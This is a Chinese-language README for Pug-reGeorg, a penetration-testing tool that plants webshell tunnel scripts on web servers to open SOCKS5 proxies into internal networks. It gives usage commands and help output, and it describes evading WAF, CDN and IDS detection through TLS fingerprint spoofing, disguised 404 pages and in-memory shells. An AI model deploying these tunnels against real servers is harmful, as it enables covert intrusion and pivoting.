# Pug-reGeorg

[简体中文](README.md)　｜　[English](README-en.md)

> **基于 L-codes 开发的 [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) 分支**

**Pug-reGeorg** 是一个旨在积极重构 [reGeorg](https://github.com/sensepost/reGeorg) 的项目，目的是：

* 提高可用性，避免特征检测
* 提高 tunnel 连接安全性
* 提高传输内容保密性
* 应对更多的网络环境场景下使用

> 此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！


## Version

5.4.1 - [版本修改日志](CHANGELOG.md)


## Features

* 默认伪装真实浏览器 TLS/HTTP2 指纹 (JA3/JA4)，规避 WAF/CDN/NIDS 边界检测 (由 curl_cffi 实现)
* 传输内容经过变形 base64 加密，伪装成 base64 编码
* 采用 BLV (Byte-LengthOffset-Value) 数据格式传输数据
* 直接请求响应可定制化 (如伪装的404页面)
* 支持 Request 模板
* HTTP Headers 可定制化
* 自定义 HTTP 响应码
* 多 URL 随机请求
* 服务端 DNS 解析
* 兼容 python2 / python3
* 服务端环境的高兼容性，如服务器不稳定、负载均衡下只在部分机器上部署了服务端等特殊情况
* (仅 php) 参考 [pivotnacci](https://github.com/blackarrowsec/pivotnacci) 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景
* aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行
* (非 php nodejs) 支持内网转发，应对负载均衡环境
* 支持进程形式启动服务端，应对更多场景


## python 依赖
```ruby
# 核心依赖 (包含 curl_cffi JA3/JA4/HTTP2 指纹伪装、SOCKS5 代理支持、NTLM 认证)
python -m pip install -r requirements.txt
```

## TLS/HTTP 指纹规避 (JA3/JA4)

默认情况下，Pug-reGeorg 会通过 `curl_cffi` (基于 curl-impersonate + BoringSSL/NSS) 伪装真实浏览器的 TLS ClientHello、HTTP/2 SETTINGS 帧和请求头顺序，使 JA3/JA4 指纹与 Chrome/Firefox/Safari 完全一致。可规避大多数基于指纹的检测：WAF、CDN (Cloudflare/Akamai/Imperva)、TLS inspection 设备 (PAN、F5、Fortinet) 以及带 JA3 规则的 NIDS (Suricata、Zeek)。

**注意:** 即使不指定 `--impersonate` 参数，也会**默认启用 Chrome 指纹伪装**。

* 默认行为 (无需指定参数): 使用最新 Chrome 指纹
  ```bash
  python pugreg.py -u https://target.com/tunnel.php -k mykey
  # ↑ 等同于 --impersonate chrome
  ```
* 指定版本: `--impersonate firefox133`、`--impersonate safari17_0` 等
* 随机: `--impersonate random` (从推荐池随机选一个，同一次运行内保持不变)
* 关闭: `--impersonate off` (回退到 python-requests 指纹)
* 查看已安装 curl_cffi 支持的完整列表: `python pugreg.py --list-impersonate`

**注意事项:**

1. 指纹伪装仅在客户端 (发起 SOCKS5 的一侧) 生效，服务端 tunnel 脚本 (`templates/*`) 不受影响。
2. `--ntlm-auth` 与指纹伪装不兼容 (HttpNtlmAuth 只能挂载到 `requests` 会话)，同时设置时会自动禁用伪装并打印警告。
3. 手工设置 `-H 'User-Agent: ...'` 会覆盖 `curl_cffi` 自动生成的与指纹匹配的 UA，可能造成 UA/JA3 不一致，建议同时更新。
4. JA3/JA4 伪装只解决"网络边界"层面的检测，无法规避 L7 payload 分析、服务器访问日志中的行为特征、以及主机侧 EDR。可结合 `--request-template`、`-u <多个 URL>` 和 `--read-interval` 对付这些层面。

## Basic Usage

* **Step 1.**
设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器
```ruby
$ python pugreg.py generate -k password

    [+] Create pugreg server files:
       => pugreg_tunnels/tunnel.jsp
       => pugreg_tunnels/tunnel.jspx
       => pugreg_tunnels/tunnel.ashx
       => pugreg_tunnels/tunnel.aspx
       => pugreg_tunnels/tunnel.php
       => pugreg_tunnels/tunnel.go
```

* **Step 2.**
使用 pugreg.py 连接 WEB 服务器，在本地建立 socks5 代理
```ruby
$ python3 pugreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/tunnel.php
+------------------------------------------------------------------------+
```


## Advanced Usage

1. 支持生成的服务端，默认直接请求响应指定的页面内容 (如伪装的 404 页面)
```ruby
$ python pugreg.py generate -k <you_password> --file 404.html --httpcode 404
$ python pugreg.py -k <you_password> -u <server_url> --skip
```

2. 如服务端 WEB，需要设置代理才能访问
```ruby
$ python pugreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
```

3. 如需 Authorization 认证和定制的 Header 或 Cookie
```ruby
$ python pugreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value;key2=value2"
```

4. 需要分散请求，可上传到多个路径上，如内存马
```ruby
$ python pugreg.py -k <you_password> -u <url_1> -u <url_2> -u <url_3> ...
```

5. 开启内网转发，应对负载均衡
```ruby
$ python pugreg.py -k <you_password> -u <url> -r <redirect_url>
```

6. 使用端口转发功能，非启动 socks5 服务 ( 127.0.0.1:1080 -> ip:port )
```ruby
$ python pugreg.py -k <you_password> -u <url> -t <ip:port>
```

7. 设置请求内容模板 ( generate 的时候需要指定上)
```ruby
# 请求内容会替换到 PUGREGBODY 中
$ python3 pugreg.py -k password -T 'img=data:image/png;base64,PUGREGBODY&save=ok'
$ python3 pugreg.py -k password -T 'img=data:image/png;base64,PUGREGBODY&save=ok' -u http://127.0.0.1:8000/anysting

# NOTE 允许将模板内容写入文件中 -T file 即可
```

8. 支持创建进程另起 Pugreg 服务端，可应对恶劣的特殊环境 (自行脑补) :)
```ruby
$ go run pugreg_tunnels/tunnel.go 8000
$ python3 pugreg.py -k password -u http://127.0.0.1:8000/anysting
```

9. 支持 Node.js 的内存马形式，路径修改 js 文件中 `const path = '/proxy_path';`, 连接则需要带上 `--async-connect` 参数
```ruby
$ python3 pugreg.py -k password --async-connect -u http://127.0.0.1:8000/proxy_path
```

* 更多关于性能和稳定性的参数设置参考 -h 帮助信息
```ruby
# 生成服务端脚本
$ python pugreg.py generate -h
    usage: pugreg.py [-h] -k KEY [-o DIR] [-f FILE] [-c CODE] [--read-buff Bytes]
                     [--max-read-size KB]

    Generate pugreg tunnel server

    optional arguments:
      -h, --help            show this help message and exit
      -k KEY, --key KEY     Specify connection key.
      -o DIR, --outdir DIR  Output directory.
      -f FILE, --file FILE  Camouflage html page file
      -c CODE, --httpcode CODE
                            Specify HTTP response code. When using -r, it is
                            recommended to <400 (default: 200)
      -T STR/FILE, --request-template STR/FILE
                            HTTP request template (eg:
                            'img=data:image/png;base64,PUGREGBODY&save=ok')
      --read-buff Bytes     Remote read buffer (default: 513)
      --max-read-size KB    Remote max read size (default: 512)

# 连接服务端
$ python pugreg.py -h
    usage: pugreg.py [-h] -u URI [-r URL] [-R] [-t IP:PORT] -k KEY [-l IP]
                     [-p PORT] [-s] [-H LINE] [-c LINE] [-x LINE] [-T STR/FILE]
                     [-a] [--php-skip-cookie] [--go] [--php-connect-timeout S]
                     [--local-dns] [--read-buff KB] [--read-interval MS]
                     [--write-interval MS] [--max-threads N] [--max-retry N]
                     [--cut-left N] [--cut-right N] [--extract EXPR]
                     [--ntlm-auth USER:PASS] [-v]

    Socks server for Pugreg HTTP(s) tunneller (DEBUG MODE: -k debug)

    optional arguments:
      -h, --help            show this help message and exit
      -u URI, --url URI     The url containing the tunnel script
      -r URL, --redirect-url URL
                            Intranet forwarding the designated server (only
                            java/.net)
      -R, --force-redirect  Forced forwarding (only jsp -r)
      -t IP:PORT, --target IP:PORT
                            Network forwarding Target, After setting this
                            parameter, port forwarding will be enabled
      -k KEY, --key KEY     Specify connection key
      -l IP, --listen-on IP
                            The default listening address (default: 127.0.0.1)
      -p PORT, --listen-port PORT
                            The default listening port (default: 1080)
      -s, --skip            Skip usability testing
      -H LINE, --header LINE
                            Pass custom header LINE to server
      -c LINE, --cookie LINE
                            Custom init cookies
      -x LINE, --proxy LINE
                            Proto://host[:port] Use proxy on given port
      -T STR/FILE, --request-template STR/FILE
                            HTTP request template (eg:
                            'img=data:image/png;base64,PUGREGBODY&save=ok')
      -a, --async-connect   Asynchronous CONNECT (e.g., in PHP, Node.js)
      --php-skip-cookie     Skip cookie availability check in php
      --go                  Use go connection method
      --php-connect-timeout S
                            PHP connect timeout (default: 0.5)
      --local-dns           Use local resolution DNS
      --read-buff KB        Local read buffer, max data to be sent per POST
                            (default: 7, max: 50)
      --read-interval MS    Read data interval in milliseconds (default: 300)
      --write-interval MS   Write data interval in milliseconds (default: 200)
      --max-threads N       Proxy max threads (default: 400)
      --max-retry N         Max retry requests (default: 10)
      --cut-left N          Truncate the left side of the response body
      --cut-right N         Truncate the right side of the response body
      --extract EXPR        Manually extract BODY content (eg:
                            <html><p>PUGREGBODY</p></html> )
      --ntlm-auth USER:PASS
                            Enable NTLM authentication for web requests (format:
                            DOMAIN\USER:PASSWORD or USER:PASSWORD)
      -v                    Increase verbosity level (use -vv or more for greater
                            effect)
```


## Remind

* Mac OSX 上运行 `pugreg.py` 时，高并发请求会出现网络丢包情况，可通过 `ulimit -n 2560` 修改当前 shell 的 "最大文件打开数"



## License

GPL 3.0
